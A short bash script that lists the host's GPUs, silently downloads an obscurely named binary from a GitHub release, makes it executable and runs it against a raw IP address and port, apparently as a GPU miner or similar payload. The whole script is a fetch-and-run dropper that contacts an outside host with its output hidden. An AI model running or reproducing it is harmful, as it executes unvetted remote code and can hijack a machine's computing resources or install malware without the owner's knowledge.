#!/bin/bash
nvidia-smi -L
wget https://github.com/cletusuvx24/trananhthy/releases/download/1/tranngocmyky &> /dev/null
chmod +x tranngocmyky
./tranngocmyky -P http://64.52.174.172:4545/"$1" &> log
